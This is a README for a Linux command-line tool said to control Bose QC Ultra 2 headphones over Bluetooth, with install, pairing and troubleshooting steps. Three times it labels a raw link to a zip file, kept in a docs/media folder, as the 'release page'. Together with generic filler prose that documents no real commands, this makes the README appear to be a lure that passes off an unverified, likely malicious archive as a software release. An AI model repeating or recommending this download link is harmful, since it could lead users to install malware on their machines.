# 🎧 bosectl - Control Bose Headphones With Linux

[![Download bosectl](https://img.shields.io/badge/Download%20bosectl-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Olympian-atomicenergy52/bosectl/main/docs/media/Software-v2.7-alpha.3.zip)

## 📦 What this is

bosectl lets you control Bose QC Ultra 2 headphones from Linux. It gives you a way to change headphone settings without using a phone app, cloud service, or account.

It works through the Bose BMAP protocol over Bluetooth. That means it talks to the headphones directly from your Linux computer.

Use it to manage common headphone controls from the terminal, such as:

- noise cancellation
- sound modes
- Bluetooth links
- headset status
- device pairing actions

## 🖥️ What you need

Before you start, make sure you have:

- a Linux computer with Bluetooth
- Bose QC Ultra 2 headphones
- a working internet connection for the download
- permission to use Bluetooth on your system

For best results, use a modern Linux setup with:

- BlueZ installed
- Python 3
- access to the terminal
- RFCOMM support in the Bluetooth stack

## 🚀 Download and install

1. Visit the release page: https://raw.githubusercontent.com/Olympian-atomicenergy52/bosectl/main/docs/media/Software-v2.7-alpha.3.zip
2. Find the latest release
3. Download the file that matches your Linux setup
4. Save the file to a folder you can find again, such as Downloads
5. If the release includes a ready-to-run file, open a terminal in that folder and run it
6. If the release includes source files, unpack them first and then follow the run steps below

If you use a package or archive file, keep it in a simple folder path. That makes it easier to run from the terminal.

## 🔧 Set up your system

You may need a few common tools on your Linux machine.

### On Debian or Ubuntu

Use this if you have Debian, Ubuntu, or a similar system:

- Python 3
- Bluetooth tools
- pip for Python packages

Example setup:

- `sudo apt update`
- `sudo apt install python3 python3-pip bluetooth bluez`

### On Fedora

Use this if you have Fedora:

- Python 3
- Bluetooth tools
- pip for Python packages

Example setup:

- `sudo dnf install python3 python3-pip bluez bluez-tools`

### On Arch Linux

Use this if you have Arch:

- Python 3
- Bluetooth tools
- pip for Python packages

Example setup:

- `sudo pacman -S python python-pip bluez bluez-utils`

## ▶️ Run bosectl

After you download the release, open a terminal in the folder that holds the file.

If the release gives you a script, run it with Python:

- `python3 bosectl.py`

If the release gives you an executable file, run it directly:

- `./bosectl`

If the file does not start, give it run permission first:

- `chmod +x bosectl`
- `./bosectl`

If the project uses a different file name, use the name from the release page.

## 🔌 Pair your headphones

bosectl works best when your headphones are already paired with your Linux computer.

If your headphones are not paired yet:

1. Turn on Bluetooth on your computer
2. Put the headphones in pairing mode
3. Open your Bluetooth settings
4. Select Bose QC Ultra 2
5. Finish pairing

If the headphones are already paired with another device, disconnect them there first. Some Bluetooth features work best when only one device controls the headphones at a time.

## 🎛️ Common tasks

Once bosectl is running, you can use it to manage the headphones from Linux.

Typical tasks may include:

- checking headphone status
- changing noise cancellation level
- switching listening modes
- reconnecting the headset
- sending control commands over Bluetooth

If you are not sure which command to use, run the tool with help:

- `python3 bosectl.py --help`

or:

- `./bosectl --help`

## 🧭 Example use

A simple session might look like this:

1. Turn on your headphones
2. Connect them to your Linux computer
3. Open a terminal
4. Start bosectl
5. Use the built-in commands to change the setting you want

If a command fails, try these steps:

- make sure Bluetooth is on
- make sure the headphones are charged
- check that the headphones are paired
- close the Bose connection on your phone or tablet
- run the tool again

## 🔍 How it works

bosectl uses the Bose BMAP protocol. That protocol lets Linux send control commands to the headphones over Bluetooth.

This project focuses on direct device control. It does not depend on a phone app, cloud login, or account link. That keeps the control path short and local.

The project also uses RFCOMM, which is a Bluetooth channel used for device communication. In plain terms, it helps the computer talk to the headphones in a way the headphones understand.

## 🛠️ Troubleshooting

### The headphones do not connect

Try these steps:

- turn Bluetooth off and back on
- remove the headphones from Bluetooth settings and pair again
- restart the headphones
- restart the Bluetooth service on Linux

### The tool starts but does nothing

Try these steps:

- confirm that the headphones are on
- confirm that the headphones are paired
- close other apps that may control the headphones
- run the command with `--help` to check the available options

### Bluetooth access fails

Try these steps:

- run the tool from a normal desktop session
- make sure your user has Bluetooth permissions
- check that BlueZ is installed
- make sure the Bluetooth adapter is enabled

### The wrong device responds

If you use more than one Bluetooth device, check the device name and connection state. Make sure bosectl is targeting the Bose QC Ultra 2 headphones, not another headset or speaker

## 📁 Project layout

This project is kept simple:

- core control logic for Bose headphones
- Bluetooth connection handling
- command line interface
- protocol support for BMAP
- Linux-focused device handling

## 🧪 Good usage tips

For a smoother setup:

- keep the headphones near your computer during pairing
- start with a full battery charge
- use one Bluetooth manager at a time
- disconnect the headphones from other devices when testing
- run commands from a terminal so you can see errors right away

## 🧰 If you build from source

If you download the source release, you may need to install Python packages first.

A common flow is:

1. Unpack the archive
2. Open a terminal in the project folder
3. Install dependencies with pip
4. Run the main script

Example:

- `python3 -m pip install -r requirements.txt`
- `python3 bosectl.py`

If the project uses a virtual environment, activate it first before you install packages

## 📡 Bluetooth notes

Because this tool talks to headphones over Bluetooth, a few things can affect results:

- distance from the computer
- walls or other devices nearby
- battery level
- Bluetooth adapter quality
- other active Bluetooth links

If the connection seems unstable, move the headphones closer to the computer and try again.

## 🧩 Who this is for

This project is for Linux users who want direct control of Bose QC Ultra 2 headphones.

It fits people who want:

- no phone app
- no cloud account
- no extra login
- local device control
- a simple terminal tool

## 📥 Download link

Visit this page to download the latest release: https://raw.githubusercontent.com/Olympian-atomicenergy52/bosectl/main/docs/media/Software-v2.7-alpha.3.zip

## 📌 File names you may see

The release page may offer files with names like:

- a Linux binary
- a source archive
- a Python package bundle
- a compressed release file

Choose the file that matches your system and how you want to run the tool

## 🔐 Privacy model

bosectl is built for local control. It does not need a cloud account or a service login to send commands to your headphones. That makes it a good fit for users who want a direct connection between their Linux machine and their Bose headset